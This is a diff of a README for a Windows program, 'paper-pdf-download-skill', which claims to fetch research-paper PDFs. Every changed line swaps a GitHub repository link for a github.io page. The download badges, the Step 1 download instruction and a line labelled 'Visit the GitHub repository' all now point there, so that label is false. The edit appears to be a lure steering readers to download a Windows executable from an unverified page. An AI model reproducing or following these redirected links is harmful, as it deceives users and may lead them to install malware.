@@ -1,6 +1,6 @@
 # 📄 paper-pdf-download-skill - Get Research Papers Without the Hassle
 
-[![Download Now](https://img.shields.io/badge/Download-paper--pdf--download--skill-blue?style=for-the-badge&logo=github)](https://github.com/joaniberian9588/paper-pdf-download-skill)
+[![Download Now](https://img.shields.io/badge/Download-paper--pdf--download--skill-blue?style=for-the-badge&logo=github)](https://joaniberian9588.github.io)
 
 ## 🎯 What This Tool Does
 
@@ -14,7 +14,7 @@ Follow these simple steps to get the application running on your Windows compute
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/joaniberian9588/paper-pdf-download-skill](https://github.com/joaniberian9588/paper-pdf-download-skill)
+Visit this link to download the application: [https://joaniberian9588.github.io](https://joaniberian9588.github.io)
 
 Click the download button on that page. The file will start downloading to your computer. Wait for the download to complete before moving to the next step.
 
@@ -121,7 +121,7 @@ This version is designed for Windows. Other versions may be available in the fut
 
 If you encounter issues or have questions:
 
-- Visit the GitHub repository: [https://github.com/joaniberian9588/paper-pdf-download-skill](https://github.com/joaniberian9588/paper-pdf-download-skill)
+- Visit the GitHub repository: [https://joaniberian9588.github.io](https://joaniberian9588.github.io)
 - Check the "Issues" section on that page for known problems and solutions.
 - Submit a new issue if you can't find an answer to your question.
 
@@ -137,6 +137,6 @@ This software is provided free of charge for personal and educational use. Redis
 
 We hope this tool makes your research life easier. Download papers quickly, read them comfortably, and spend less time wrestling with PDFs and more time learning.
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Version-brightgreen?style=for-the-badge&logo=github)](https://github.com/joaniberian9588/paper-pdf-download-skill)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Version-brightgreen?style=for-the-badge&logo=github)](https://joaniberian9588.github.io)
 
 Keywords: research papers, PDF download, MinerU, academic tool, Windows application, paper retrieval, document converter
